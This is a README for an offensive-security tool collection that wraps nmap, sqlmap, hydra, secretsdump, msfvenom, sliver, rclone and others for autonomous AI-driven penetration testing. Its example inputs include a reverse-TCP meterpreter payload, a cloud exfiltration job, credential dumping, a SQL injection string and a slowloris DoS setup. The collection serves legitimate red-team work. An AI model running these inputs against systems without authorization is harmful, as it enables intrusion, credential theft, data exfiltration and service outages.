# Gibson Tools Ecosystem

The Gibson Tools Ecosystem is a comprehensive, AI-automation-ready offensive security tool collection organized by MITRE ATT&CK phases. This monorepo provides the Gibson Framework with programmatic access to 33+ industry-standard security tools through a unified SDK interface, enabling autonomous AI-driven penetration testing and red team operations.

[![Go Version](https://img.shields.io/badge/go-1.24.4-blue.svg)](https://golang.org)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

## Table of Contents

- [Overview](#overview)
- [Architecture Overview](#architecture-overview)
- [Tool Inventory](#tool-inventory)
  - [Reconnaissance (TA0043)](#reconnaissance-ta0043)
  - [Resource Development (TA0042)](#resource-development-ta0042)
  - [Initial Access (TA0001)](#initial-access-ta0001)
  - [Execution (TA0002)](#execution-ta0002)
  - [Persistence (TA0003)](#persistence-ta0003)
  - [Privilege Escalation (TA0004)](#privilege-escalation-ta0004)
  - [Defense Evasion (TA0005)](#defense-evasion-ta0005)
  - [Credential Access (TA0006)](#credential-access-ta0006)
  - [Discovery (TA0007)](#discovery-ta0007)
  - [Lateral Movement (TA0008)](#lateral-movement-ta0008)
  - [Collection (TA0009)](#collection-ta0009)
  - [Command and Control (TA0011)](#command-and-control-ta0011)
  - [Exfiltration (TA0010)](#exfiltration-ta0010)
  - [Impact (TA0040)](#impact-ta0040)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Tool Usage Examples](#tool-usage-examples)
- [MITRE ATT&CK Mappings](#mitre-attck-mappings)
- [Security Policy](#security-policy)
- [Contributing](#contributing)
- [License](#license)

## Overview

The Gibson Tools Ecosystem provides:

- **33+ Security Tools**: Comprehensive coverage across all 14 MITRE ATT&CK phases
- **Structured JSON I/O**: All tools have validated input/output schemas for LLM consumption
- **Health Monitoring**: Automated dependency validation and health checks
- **ATT&CK Mapping**: Every tool maps to specific MITRE ATT&CK techniques
- **Unified Interface**: Consistent Gibson SDK tool interface across all tools
- **gRPC Ready**: All tools can be served over gRPC for distributed execution

## Architecture Overview

### High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                       GIBSON TOOLS ECOSYSTEM                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ┌──────────────────────────────────────────────────────────────────┐      │
│   │                    SHARED UTILITIES (pkg/)                        │      │
│   │  ┌─────────────┐ ┌──────────┐ ┌──────────┐ ┌──────────────┐     │      │
│   │  │  Executor   │ │  Parser  │ │  Health  │ │    Common    │     │      │
│   │  │  • Execute  │ │  • XML   │ │  • Binary│ │  • ToolError │     │      │
│   │  │  • Binary   │ │  • JSON  │ │  • Cap   │ │  • Helpers   │     │      │
│   │  │    Exists   │ │  • Text  │ │  • File  │ │  • Timeout   │     │      │
│   │  └─────────────┘ └──────────┘ └──────────┘ └──────────────┘     │      │
│   └──────────────────────────────────────────────────────────────────┘      │
│                                    │                                         │
│                    ┌───────────────┴───────────────┐                        │
│                    ▼                               ▼                        │
│   ┌──────────────────────────────┐   ┌──────────────────────────────┐      │
│   │  RECONNAISSANCE TOOLS        │   │  INITIAL ACCESS TOOLS        │      │
│   │  • nmap                      │   │  • sqlmap                    │      │
│   │  • masscan                   │   │  • gobuster                  │      │
│   │  • subfinder                 │   │  • hydra                     │      │
│   │  • httpx                     │   │  • metasploit                │      │
│   │  • amass                     │   └──────────────────────────────┘      │
│   │  • theHarvester              │                                         │
│   │  • nuclei                    │   ┌──────────────────────────────┐      │
│   │  • playwright                │   │  PRIVILEGE ESCALATION        │      │
│   │  • shodan                    │   │  • linpeas                   │      │
│   │  • spiderfoot                │   │  • winpeas                   │      │
│   │  • recon-ng                  │   │  • hashcat                   │      │
│   └──────────────────────────────┘   │  • john                      │      │
│                                      └──────────────────────────────┘      │
│   ┌──────────────────────────────┐                                         │
│   │  DISCOVERY TOOLS             │   ┌──────────────────────────────┐      │
│   │  • crackmapexec              │   │  EXECUTION TOOLS             │      │
│   │  • bloodhound.py             │   │  • evil-winrm                │      │
│   └──────────────────────────────┘   │  • impacket                  │      │
│                                      └──────────────────────────────┘      │
│   ┌──────────────────────────────┐                                         │
│   │  CREDENTIAL ACCESS           │   ┌──────────────────────────────┐      │
│   │  • responder                 │   │  LATERAL MOVEMENT            │      │
│   │  • secretsdump               │   │  • proxychains               │      │
│   └──────────────────────────────┘   │  • xfreerdp                  │      │
│                                      └──────────────────────────────┘      │
│   ┌──────────────────────────────┐                                         │
│   │  ADDITIONAL TOOLS            │                                         │
│   │  • chisel (persistence)      │                                         │
│   │  • msfvenom (evasion)        │                                         │
│   │  • tshark (collection)       │                                         │
│   │  • sliver (C2)               │                                         │
│   │  • rclone (exfiltration)     │                                         │
│   │  • slowhttptest (impact)     │                                         │
│   │  • searchsploit (resource)   │                                         │
│   └──────────────────────────────┘                                         │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Tool Package Structure

Each tool follows a consistent structure:

```
{phase}/{tool-name}/
├── component.yaml       # Component manifest (required for gibson install)
├── main.go              # Entry point and gRPC server
├── tool.go              # Tool implementation (Execute, Health)
├── schema.go            # Input/Output schema definitions
├── parser.go            # Output parsing logic (if complex)
├── go.mod               # Module definition
└── go.sum               # Dependency checksums
```

### Component Manifest (component.yaml)

Every tool includes a `component.yaml` manifest that defines how the tool is built, run, and what dependencies it requires. This is used by `gibson tool install` to automate installation.

```yaml
kind: tool                    # Component type: tool, agent, or plugin
name: nmap                    # Unique tool name
version: 1.0.0               # Semantic version
description: Network scanner for port discovery and service detection
author: Gibson Security Team
license: MIT
repository: https://github.com/zero-day-ai/gibson-tools-official

build:
  command: go build -o nmap . # Build command
  artifacts:
    - nmap                    # Expected build outputs
  workdir: .                  # Working directory for build

runtime:
  type: go                    # Runtime type: go, python, docker
  entrypoint: ./nmap          # Executable path
  port: 0                     # gRPC port (0 = dynamic)

dependencies:
  gibson: ">=1.0.0"           # Minimum Gibson version
  system:
    - nmap                    # External binaries that must be installed
  env: {}                     # Required environment variables
```

**Key Fields:**

| Field | Description |
|-------|-------------|
| `kind` | Component type (`tool`, `agent`, `plugin`) |
| `name` | Unique identifier matching directory name |
| `build.command` | Command to compile the wrapper |
| `build.artifacts` | Expected output files |
| `runtime.entrypoint` | Path to compiled binary |
| `dependencies.system` | External tools that must be pre-installed |
| `dependencies.env` | Required environment variables (e.g., API keys)

For complete documentation, see [SDK Tools Guide](../sdk/docs/TOOLS.md).

## Tool Inventory

### Reconnaissance (TA0043)

#### Nmap - Network Scanner
**Priority**: Tier 1
**Location**: `discovery/nmap/`
**ATT&CK Techniques**: T1046 (Network Service Scanning), T1595.001 (Scanning IP Blocks), T1592.002 (Software Detection)

Comprehensive network scanner supporting multiple scan types, service detection, OS fingerprinting, and NSE scripts.

**Input Schema**:
```json
{
  "targets": "192.168.1.0/24",
  "ports": "22,80,443,8080",
  "scan_type": "syn",
  "timing": "normal",
  "service_detection": true,
  "os_detection": false,
  "script_scan": false,
  "scripts": ["http-title", "ssl-cert"]
}
```

**Output Schema**:
```json
{
  "scan_info": {
    "scanner": "nmap",
    "start_time": "2025-12-29T10:00:00Z",
    "elapsed_seconds": 12.5
  },
  "hosts": [{
    "ip": "192.168.1.10",
    "status": "up",
    "ports": [{
      "port": 22,
      "protocol": "tcp",
      "state": "open",
      "service": {
        "name": "ssh",
        "product": "OpenSSH",
        "version": "8.9"
      }
    }]
  }],
  "run_stats": {
    "hosts_up": 5,
    "hosts_total": 254
  }
}
```

---

#### Masscan - Fast Port Scanner
**Priority**: Tier 1
**Location**: `discovery/masscan/`
**ATT&CK Techniques**: T1046 (Network Service Scanning)

High-speed network scanner capable of scanning the entire Internet in minutes.

**Input Schema**:
```json
{
  "targets": "10.0.0.0/8",
  "ports": "80,443",
  "rate": 10000,
  "banners": true
}
```

---

#### Subfinder - Subdomain Enumeration
**Priority**: Tier 1
**Location**: `reconnaissance/subfinder/`
**ATT&CK Techniques**: T1595.002 (Active Scanning), T1592 (Gather Victim Host Information)

Discover subdomains using passive OSINT sources.

**Input Schema**:
```json
{
  "domain": "example.com",
  "sources": ["crtsh", "hackertarget"],
  "recursive": false,
  "timeout": 300
}
```

**Output Schema**:
```json
{
  "domain": "example.com",
  "subdomains": ["www.example.com", "api.example.com", "mail.example.com"],
  "count": 3,
  "sources_used": ["crtsh", "hackertarget"],
  "scan_time_ms": 5420
}
```

---

#### Httpx - HTTP Probing
**Priority**: Tier 1
**Location**: `reconnaissance/httpx/`
**ATT&CK Techniques**: T1595.002 (Active Scanning), T1592.002 (Software Detection)

Probe HTTP services and extract metadata, titles, and technology fingerprints.

**Input Schema**:
```json
{
  "targets": ["example.com", "test.com"],
  "ports": "80,443,8080,8443",
  "extract_title": true,
  "extract_tech": true,
  "follow_redirects": true
}
```

**Output Schema**:
```json
{
  "results": [{
    "url": "https://example.com",
    "status_code": 200,
    "title": "Example Domain",
    "technologies": ["Cloudflare", "Nginx"],
    "tls": {
      "version": "TLS 1.3",
      "cipher": "TLS_AES_256_GCM_SHA384"
    }
  }],
  "total_probed": 2,
  "alive_count": 1
}
```

---

#### Amass - Asset Discovery
**Priority**: Tier 1
**Location**: `reconnaissance/amass/`
**ATT&CK Techniques**: T1595 (Active Scanning), T1592 (Gather Victim Host Information)

Comprehensive OSINT tool for asset discovery including DNS, WHOIS, and ASN data.

**Input Schema**:
```json
{
  "domain": "example.com",
  "mode": "passive",
  "include_whois": true,
  "include_asn": true,
  "max_depth": 2
}
```

---

#### theHarvester - Email/Domain OSINT
**Priority**: Tier 1
**Location**: `reconnaissance/theharvester/`
**ATT&CK Techniques**: T1589.002 (Email Addresses), T1591 (Gather Victim Org Information)

Harvest email addresses, employee names, and host information from public sources.

**Input Schema**:
```json
{
  "domain": "example.com",
  "sources": ["google", "bing", "linkedin"],
  "limit": 500
}
```

**Output Schema**:
```json
{
  "domain": "example.com",
  "emails": ["admin@example.com", "info@example.com"],
  "hosts": ["www.example.com", "mail.example.com"],
  "people": ["John Doe", "Jane Smith"],
  "sources_queried": ["google", "bing"]
}
```

---

#### Nuclei - Vulnerability Scanner
**Priority**: Tier 1
**Location**: `reconnaissance/nuclei/`
**ATT&CK Techniques**: T1595.002 (Active Scanning), T1190 (Exploit Public-Facing Application)

Fast and customizable vulnerability scanner using YAML templates.

**Input Schema**:
```json
{
  "targets": ["https://example.com"],
  "tags": ["cve", "rce", "sqli"],
  "severity": ["critical", "high"],
  "templates": [],
  "concurrency": 25
}
```

**Output Schema**:
```json
{
  "findings": [{
    "template_id": "CVE-2021-44228",
    "name": "Log4Shell RCE",
    "severity": "critical",
    "host": "https://example.com",
    "matched_at": "https://example.com/api/search",
    "cve_id": "CVE-2021-44228",
    "cvss_score": 10.0,
    "description": "Apache Log4j2 Remote Code Execution"
  }],
  "findings_count": 1,
  "scan_time_ms": 8500
}
```

---

#### Playwright - Browser Automation
**Priority**: Tier 1
**Location**: `reconnaissance/playwright/`
**ATT&CK Techniques**: T1592.002 (Software Detection), T1593 (Search Websites), T1189 (Drive-by Compromise)

Automate browser interactions for JavaScript-heavy sites, screenshots, and DOM extraction.

**Input Schema**:
```json
{
  "action": "screenshot",
  "url": "https://example.com",
  "browser": "chromium",
  "headless": true,
  "screenshot_options": {
    "full_page": true,
    "type": "png"
  }
}
```

**Output Schema**:
```json
{
  "success": true,
  "action": "screenshot",
  "url": "https://example.com",
  "final_url": "https://example.com",
  "status_code": 200,
  "title": "Example Domain",
  "content": {
    "screenshot_path": "/tmp/screenshot-123.png"
  },
  "network_requests": [{
    "url": "https://example.com/app.js",
    "method": "GET",
    "status": 200
  }]
}
```

---

#### Shodan - Internet-Wide Search
**Priority**: Tier 2
**Location**: `reconnaissance/shodan/`
**ATT&CK Techniques**: T1596 (Search Open Technical Databases)

Search Shodan for internet-exposed devices and vulnerabilities.

**Input Schema**:
```json
{
  "query": "apache country:US",
  "api_key": "SHODAN_API_KEY",
  "limit": 100
}
```

---

#### SpiderFoot - Automated OSINT
**Priority**: Tier 2
**Location**: `reconnaissance/spiderfoot/`
**ATT&CK Techniques**: T1589, T1590, T1591, T1592

Automated OSINT correlation discovering relationships between target assets.

---

#### Recon-ng - OSINT Framework
**Priority**: Tier 2
**Location**: `reconnaissance/recon-ng/`
**ATT&CK Techniques**: T1589, T1590, T1591, T1592

Modular OSINT framework with extensive module library.

---

### Resource Development (TA0042)

#### SearchSploit - Exploit Search
**Priority**: Tier 2
**Location**: `resource-development/searchsploit/`
**ATT&CK Techniques**: T1587.004 (Develop Capabilities: Exploits), T1588.005 (Obtain Capabilities: Exploits)

Search Exploit-DB for exploits matching discovered vulnerabilities.

**Input Schema**:
```json
{
  "query": "apache 2.4",
  "cve": "CVE-2021-41773",
  "exact": false,
  "platform": "linux"
}
```

**Output Schema**:
```json
{
  "results": [{
    "id": "50383",
    "title": "Apache HTTP Server 2.4.49 - Path Traversal & RCE",
    "path": "/usr/share/exploitdb/exploits/linux/webapps/50383.sh",
    "platform": "linux",
    "date": "2021-10-05"
  }],
  "total_results": 1
}
```

---

### Initial Access (TA0001)

#### SQLMap - SQL Injection
**Priority**: Tier 1
**Location**: `initial-access/sqlmap/`
**ATT&CK Techniques**: T1190 (Exploit Public-Facing Application)

Automated SQL injection detection and exploitation.

**Input Schema**:
```json
{
  "url": "https://example.com/search?q=test",
  "param": "q",
  "level": 3,
  "risk": 2,
  "batch": true,
  "dbs": true
}
```

**Output Schema**:
```json
{
  "vulnerable": true,
  "injection_point": {
    "parameter": "q",
    "type": "boolean-based blind",
    "payload": "test' AND 1=1-- -"
  },
  "dbms": "MySQL 8.0.27",
  "databases": ["information_schema", "mysql", "webapp_db"],
  "current_user": "webapp_user@localhost",
  "is_dba": false
}
```

---

#### Gobuster - Directory Brute-Force
**Priority**: Tier 2
**Location**: `initial-access/gobuster/`
**ATT&CK Techniques**: T1595.003 (Wordlist Scanning)

Fast directory/file brute-forcing tool.

**Input Schema**:
```json
{
  "url": "https://example.com",
  "wordlist": "/usr/share/wordlists/dirb/common.txt",
  "mode": "dir",
  "extensions": ["php", "html", "js"],
  "threads": 50
}
```

---

#### Hydra - Authentication Brute-Force
**Priority**: Tier 1
**Location**: `initial-access/hydra/`
**ATT&CK Techniques**: T1110 (Brute Force), T1110.001 (Password Guessing), T1110.003 (Password Spraying)

Network authentication brute-force tool supporting 50+ protocols.

**Input Schema**:
```json
{
  "target": "192.168.1.10",
  "service": "ssh",
  "port": 22,
  "username": "admin",
  "password_file": "/usr/share/wordlists/rockyou.txt",
  "threads": 16
}
```

**Output Schema**:
```json
{
  "success": true,
  "credentials": [{
    "host": "192.168.1.10",
    "port": 22,
    "service": "ssh",
    "username": "admin",
    "password": "password123"
  }],
  "attempts": 1523
}
```

---

#### Metasploit - Exploitation Framework
**Priority**: Tier 2
**Location**: `initial-access/metasploit/`
**ATT&CK Techniques**: T1190, T1203 (Exploitation for Client Execution)

Industry-standard exploitation framework.

---

### Execution (TA0002)

#### Evil-WinRM - Windows Remote Shell
**Priority**: Tier 2
**Location**: `execution/evil-winrm/`
**ATT&CK Techniques**: T1021.006 (Windows Remote Management)

Execute commands on Windows systems via WinRM.

**Input Schema**:
```json
{
  "target": "192.168.1.100",
  "username": "administrator",
  "password": "P@ssw0rd",
  "command": "whoami",
  "port": 5985
}
```

---

#### Impacket - Windows Protocol Suite
**Priority**: Tier 1
**Location**: `execution/impacket/`
**ATT&CK Techniques**: T1021.002 (SMB/Windows Admin Shares), T1021.003 (DCOM), T1047 (WMI)

Execute commands via various Windows protocols (SMB, WMI, DCOM).

**Input Schema**:
```json
{
  "tool": "wmiexec",
  "target": "192.168.1.100",
  "domain": "CORP",
  "username": "administrator",
  "password": "P@ssw0rd",
  "command": "ipconfig /all"
}
```

**Output Schema**:
```json
{
  "success": true,
  "tool": "wmiexec",
  "output": "Windows IP Configuration\n\nHost Name: DESKTOP-ABC123...",
  "execution_time_ms": 1250
}
```

---

### Persistence (TA0003)

#### Chisel - Tunneling
**Priority**: Tier 2
**Location**: `persistence/chisel/`
**ATT&CK Techniques**: T1572 (Protocol Tunneling)

Fast TCP/UDP tunnel over HTTP secured via SSH.

**Input Schema**:
```json
{
  "mode": "server",
  "local_port": 8080,
  "remote": "3000:localhost:3000",
  "reverse": false
}
```

---

### Privilege Escalation (TA0004)

#### LinPEAS - Linux Privilege Escalation
**Priority**: Tier 1
**Location**: `privilege-escalation/linpeas/`
**ATT&CK Techniques**: T1548 (Abuse Elevation Control Mechanism)

Enumerate Linux privilege escalation vectors.

**Input Schema**:
```json
{
  "target_shell": "ssh user@target",
  "intensity": "normal"
}
```

**Output Schema**:
```json
{
  "system_info": {
    "hostname": "target-server",
    "kernel": "5.15.0-56-generic"
  },
  "users": [{
    "username": "www-data",
    "groups": ["www-data"],
    "sudo_privileges": []
  }],
  "suid_binaries": ["/usr/bin/passwd", "/usr/bin/sudo"],
  "writable_paths": ["/tmp", "/var/tmp"],
  "possible_exploits": [{
    "name": "CVE-2022-0847 (DirtyPipe)",
    "description": "Kernel privilege escalation",
    "confidence": "high"
  }]
}
```

---

#### WinPEAS - Windows Privilege Escalation
**Priority**: Tier 1
**Location**: `privilege-escalation/winpeas/`
**ATT&CK Techniques**: T1548, T1134 (Access Token Manipulation)

Enumerate Windows privilege escalation vectors.

---

#### Hashcat - Password Cracking (GPU)
**Priority**: Tier 1
**Location**: `privilege-escalation/hashcat/`
**ATT&CK Techniques**: T1110.002 (Password Cracking)

GPU-accelerated password hash cracking.

**Input Schema**:
```json
{
  "hash_file": "/tmp/hashes.txt",
  "hash_type": 1000,
  "attack_mode": "dictionary",
  "wordlist": "/usr/share/wordlists/rockyou.txt",
  "rules": "best64"
}
```

**Output Schema**:
```json
{
  "cracked": [{
    "hash": "5f4dcc3b5aa765d61d8327deb882cf99",
    "plaintext": "password"
  }],
  "total_hashes": 10,
  "cracked_count": 3,
  "exhausted": false,
  "speed": "1234.5 MH/s"
}
```

---

#### John the Ripper - Password Cracking (CPU)
**Priority**: Tier 1
**Location**: `privilege-escalation/john/`
**ATT&CK Techniques**: T1110.002 (Password Cracking)

CPU-based password cracking with format converters.

---

### Defense Evasion (TA0005)

#### MSFVenom - Payload Generation
**Priority**: Tier 2
**Location**: `defense-evasion/msfvenom/`
**ATT&CK Techniques**: T1027 (Obfuscated Files or Information)

Generate encoded payloads in various formats.

**Input Schema**:
```json
{
  "payload": "windows/meterpreter/reverse_tcp",
  "format": "exe",
  "lhost": "192.168.1.5",
  "lport": 4444,
  "encoder": "x86/shikata_ga_nai",
  "iterations": 5
}
```

---

### Credential Access (TA0006)

#### Responder - LLMNR/NBT-NS Poisoning
**Priority**: Tier 2
**Location**: `credential-access/responder/`
**ATT&CK Techniques**: T1557.001 (LLMNR/NBT-NS Poisoning)

Capture authentication attempts via protocol poisoning.

**Input Schema**:
```json
{
  "interface": "eth0",
  "analyze_mode": false,
  "timeout": 300
}
```

**Output Schema**:
```json
{
  "captured_hashes": [{
    "protocol": "NTLMv2",
    "client_ip": "192.168.1.50",
    "username": "jdoe",
    "domain": "CORP",
    "hash": "jdoe::CORP:1122334455667788:ABC123..."
  }],
  "capture_time_seconds": 300
}
```

---

#### SecretsDump - Credential Dumping
**Priority**: Tier 1
**Location**: `credential-access/secretsdump/`
**ATT&CK Techniques**: T1003.002 (Security Account Manager), T1003.003 (NTDS)

Dump credentials from domain controllers and SAM databases.

**Input Schema**:
```json
{
  "target": "192.168.1.10",
  "domain": "CORP",
  "username": "administrator",
  "password": "P@ssw0rd",
  "method": "ntds"
}
```

**Output Schema**:
```json
{
  "domain_users": [{
    "username": "Administrator",
    "rid": 500,
    "lm_hash": "aad3b435b51404eeaad3b435b51404ee",
    "nt_hash": "31d6cfe0d16ae931b73c59d7e0c089c0"
  }],
  "machine_accounts": [],
  "cached_credentials": []
}
```

---

### Discovery (TA0007)

#### CrackMapExec - Active Directory Enumeration
**Priority**: Tier 1
**Location**: `discovery/crackmapexec/`
**ATT&CK Techniques**: T1087.002 (Domain Account), T1018 (Remote System Discovery)

Enumerate Active Directory environments.

**Input Schema**:
```json
{
  "target": "192.168.1.0/24",
  "protocol": "smb",
  "username": "user",
  "password": "pass",
  "module": "shares"
}
```

---

#### BloodHound.py - AD Graph Analysis
**Priority**: Tier 1
**Location**: `discovery/bloodhound/`
**ATT&CK Techniques**: T1087 (Account Discovery), T1069 (Permission Groups Discovery)

Map Active Directory relationships for privilege escalation paths.

**Input Schema**:
```json
{
  "domain": "corp.local",
  "username": "user@corp.local",
  "password": "P@ssw0rd",
  "collection_method": "all"
}
```

**Output Schema**:
```json
{
  "users": 1523,
  "groups": 234,
  "computers": 456,
  "domains": 1,
  "output_files": ["/tmp/bloodhound_computers.json", "/tmp/bloodhound_users.json"],
  "collection_time_ms": 45000
}
```

---

### Lateral Movement (TA0008)

#### Proxychains - Proxy Chain
**Priority**: Tier 2
**Location**: `lateral-movement/proxychains/`
**ATT&CK Techniques**: T1090 (Proxy)

Route traffic through proxy chains for internal network access.

**Input Schema**:
```json
{
  "proxies": [{
    "type": "socks5",
    "host": "192.168.1.5",
    "port": 1080
  }],
  "command": "nmap 10.0.0.1"
}
```

---

#### xFreeRDP - RDP Client
**Priority**: Tier 3
**Location**: `lateral-movement/xfreerdp/`
**ATT&CK Techniques**: T1021.001 (Remote Desktop Protocol)

Connect to systems via RDP with pass-the-hash support.

---

### Collection (TA0009)

#### TShark - Packet Capture
**Priority**: Tier 2
**Location**: `collection/tshark/`
**ATT&CK Techniques**: T1040 (Network Sniffing)

Capture and analyze network traffic.

**Input Schema**:
```json
{
  "interface": "eth0",
  "filter": "tcp port 443",
  "duration": 60,
  "packet_count": 1000
}
```

---

### Command and Control (TA0011)

#### Sliver - C2 Framework
**Priority**: Tier 2
**Location**: `command-and-control/sliver/`
**ATT&CK Techniques**: T1071 (Application Layer Protocol)

Manage Sliver C2 implants and sessions.

**Input Schema**:
```json
{
  "action": "sessions",
  "session_id": "abc123",
  "command": "whoami"
}
```

---

### Exfiltration (TA0010)

#### Rclone - Cloud Sync
**Priority**: Tier 2
**Location**: `exfiltration/rclone/`
**ATT&CK Techniques**: T1567.002 (Exfiltration to Cloud Storage)

Transfer files to cloud storage providers.

**Input Schema**:
```json
{
  "source": "/tmp/sensitive-data/",
  "destination": "s3:my-bucket/exfil/",
  "provider": "s3",
  "config": {
    "access_key_id": "AKIAIOSFODNN7EXAMPLE",
    "secret_access_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
  }
}
```

**Output Schema**:
```json
{
  "transferred": 1048576,
  "files_count": 15,
  "transfer_rate": "2.5 MB/s",
  "destination_url": "s3://my-bucket/exfil/"
}
```

---

### Impact (TA0040)

#### SlowHTTPTest - DoS Testing
**Priority**: Tier 3
**Location**: `impact/slowhttptest/`
**ATT&CK Techniques**: T1499 (Endpoint Denial of Service)

Test system resilience to slow HTTP attacks.

**Input Schema**:
```json
{
  "target": "https://example.com",
  "attack_type": "slowloris",
  "connections": 200,
  "duration": 300
}
```

---

## Installation

### Prerequisites

- Go 1.24.4 or later
- Gibson SDK (`github.com/zero-day-ai/sdk`)
- Gibson CLI (`github.com/zero-day-ai/gibson`)
- Target security tools installed (varies by tool)

### Option 1: Install via Gibson CLI (Recommended)

The easiest way to install tools is via the Gibson CLI:

```bash
# Install a single tool
gibson tool install https://github.com/zero-day-ai/gibson-tools-official/tool/nmap

# Install with specific branch
gibson tool install https://github.com/zero-day-ai/gibson-tools-official/tool/nmap --branch main

# Force reinstall
gibson tool install https://github.com/zero-day-ai/gibson-tools-official/tool/nmap --force
```

This will:
1. Clone the tool to `~/.gibson/tools/<name>/`
2. Read the `component.yaml` manifest
3. Check system dependencies
4. Build the tool wrapper
5. Register it in the component registry

### Option 2: Clone and Build Manually

```bash
git clone https://github.com/zero-day-ai/gibson-tools-official.git
cd gibson-tools-official

# Build all tools
make build

# Or build specific tool
cd discovery/nmap
go build -o ../../bin/nmap .
```

### Build System

```bash
# Build all tools
make build

# Build by MITRE ATT&CK phase
make build-recon           # Reconnaissance tools
make build-discovery       # Discovery tools
make build-initial-access  # Initial access tools
make build-privesc         # Privilege escalation tools

# Run tests
make test                  # Unit tests
make integration-test      # Integration tests (requires external binaries)

# Other commands
make clean                 # Clean build artifacts
make help                  # Show all available targets
```

### Install Dependencies

Tools wrap external binaries. Install the tools you need:

```bash
# Debian/Ubuntu
sudo apt-get install nmap masscan subfinder httpx amass \
  nuclei gobuster hydra sqlmap metasploit-framework \
  impacket-scripts evil-winrm john hashcat responder \
  bloodhound.py crackmapexec chisel rclone tshark \
  proxychains-ng xfreerdp

# macOS (Homebrew)
brew install nmap masscan subfinder httpx amass nuclei \
  gobuster hydra sqlmap metasploit john hashcat chisel \
  rclone wireshark proxychains-ng

# Some tools require manual installation
# See individual tool READMEs for details
```

## Quick Start

### Serving a Tool

Each tool can be served as a gRPC service:

```bash
# Serve nmap tool
cd discovery/nmap
go run . --port 50051
```

### Using a Tool Directly

```go
package main

import (
    "context"
    "log"

    nmap "github.com/zero-day-ai/gibson-tools-official/discovery/nmap"
)

func main() {
    tool := nmap.NewTool()

    ctx := context.Background()

    // Check health
    health := tool.Health(ctx)
    log.Printf("Health: %s", health.Status)

    // Execute scan
    output, err := tool.Execute(ctx, map[string]any{
        "targets": "192.168.1.0/24",
        "ports": "22,80,443",
        "scan_type": "syn",
    })
    if err != nil {
        log.Fatal(err)
    }

    log.Printf("Scan results: %+v", output)
}
```

### Using with Gibson Framework

```go
package main

import (
    "context"
    "log"

    "github.com/zero-day-ai/sdk"
    nmap "github.com/zero-day-ai/gibson-tools-official/discovery/nmap"
)

func main() {
    framework, _ := sdk.NewFramework()

    // Register tool
    nmapTool := nmap.NewTool()
    framework.Tools().Register(nmapTool)

    // Agent can now call tool via harness
    // result := harness.CallTool(ctx, "nmap", params)
}
```

## Tool Usage Examples

### Network Reconnaissance Workflow

```go
// 1. Discover subdomains
subfinderOut, _ := harness.CallTool(ctx, "subfinder", map[string]any{
    "domain": "example.com",
})

// 2. Probe discovered hosts
httpxOut, _ := harness.CallTool(ctx, "httpx", map[string]any{
    "targets": subfinderOut["subdomains"].([]string),
    "extract_tech": true,
})

// 3. Scan for vulnerabilities
nucleiOut, _ := harness.CallTool(ctx, "nuclei", map[string]any{
    "targets": []string{httpxOut["results"].([]any)[0].(map[string]any)["url"].(string)},
    "severity": []string{"critical", "high"},
})
```

### Active Directory Enumeration

```go
// 1. Enumerate domain
cmeOut, _ := harness.CallTool(ctx, "crackmapexec", map[string]any{
    "target": "192.168.1.0/24",
    "protocol": "smb",
    "username": "user",
    "password": "pass",
})

// 2. Collect BloodHound data
bhOut, _ := harness.CallTool(ctx, "bloodhound", map[string]any{
    "domain": "corp.local",
    "username": "user@corp.local",
    "password": "P@ssw0rd",
    "collection_method": "all",
})

// 3. Dump credentials
secretsOut, _ := harness.CallTool(ctx, "secretsdump", map[string]any{
    "target": "192.168.1.10",
    "username": "administrator",
    "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
})
```

### Web Application Testing

```go
// 1. Discover directories
gobusterOut, _ := harness.CallTool(ctx, "gobuster", map[string]any{
    "url": "https://example.com",
    "wordlist": "/usr/share/wordlists/dirb/common.txt",
    "extensions": []string{"php", "html"},
})

// 2. Test for SQL injection
sqlmapOut, _ := harness.CallTool(ctx, "sqlmap", map[string]any{
    "url": "https://example.com/search?q=test",
    "level": 3,
    "risk": 2,
})

// 3. Browser-based testing
playwrightOut, _ := harness.CallTool(ctx, "playwright", map[string]any{
    "action": "crawl",
    "url": "https://example.com",
    "crawl_options": map[string]any{
        "max_depth": 2,
        "extract_forms": true,
    },
})
```

## MITRE ATT&CK Mappings

### Complete ATT&CK Coverage

| Phase | ID | Tools |
|-------|----|----|
| Reconnaissance | TA0043 | nmap, masscan, subfinder, httpx, amass, theHarvester, nuclei, playwright, shodan, spiderfoot, recon-ng |
| Resource Development | TA0042 | searchsploit |
| Initial Access | TA0001 | sqlmap, gobuster, hydra, metasploit |
| Execution | TA0002 | evil-winrm, impacket |
| Persistence | TA0003 | chisel |
| Privilege Escalation | TA0004 | linpeas, winpeas, hashcat, john |
| Defense Evasion | TA0005 | msfvenom |
| Credential Access | TA0006 | responder, secretsdump |
| Discovery | TA0007 | nmap, masscan, crackmapexec, bloodhound |
| Lateral Movement | TA0008 | proxychains, xfreerdp |
| Collection | TA0009 | tshark |
| Command and Control | TA0011 | sliver |
| Exfiltration | TA0010 | rclone |
| Impact | TA0040 | slowhttptest |

### Technique-Level Mappings

**T1046 - Network Service Scanning**
- nmap, masscan

**T1110 - Brute Force**
- hydra, hashcat, john

**T1190 - Exploit Public-Facing Application**
- sqlmap, nuclei, metasploit

**T1595 - Active Scanning**
- nmap, masscan, subfinder, httpx, amass, nuclei

**T1021 - Remote Services**
- evil-winrm (T1021.006), impacket (T1021.002, T1021.003), xfreerdp (T1021.001)

**T1003 - OS Credential Dumping**
- secretsdump (T1003.002, T1003.003)

**T1087 - Account Discovery**
- crackmapexec (T1087.002), bloodhound (T1087.002)

**T1548 - Abuse Elevation Control**
- linpeas, winpeas

**T1557 - Adversary-in-the-Middle**
- responder (T1557.001)

## Security Policy

### No Binaries in Repository

**IMPORTANT**: This repository contains **source code only**. No pre-compiled binaries are permitted in this repository for security reasons.

#### Why Source Code Only?

1. **Supply Chain Security**: Pre-compiled binaries cannot be audited and may contain malicious code, backdoors, or vulnerabilities that are not present in the source code.

2. **Transparency**: All code must be reviewable. Users and security researchers should be able to verify exactly what they are running.

3. **Reproducible Builds**: Building from source ensures that the binary matches the source code and hasn't been tampered with.

4. **Trust Verification**: In offensive security tooling, trust is paramount. Source code allows security teams to verify tool behavior before deployment.

#### Build Requirements

All tools must be built locally from source:

```bash
# Build all tools
make build

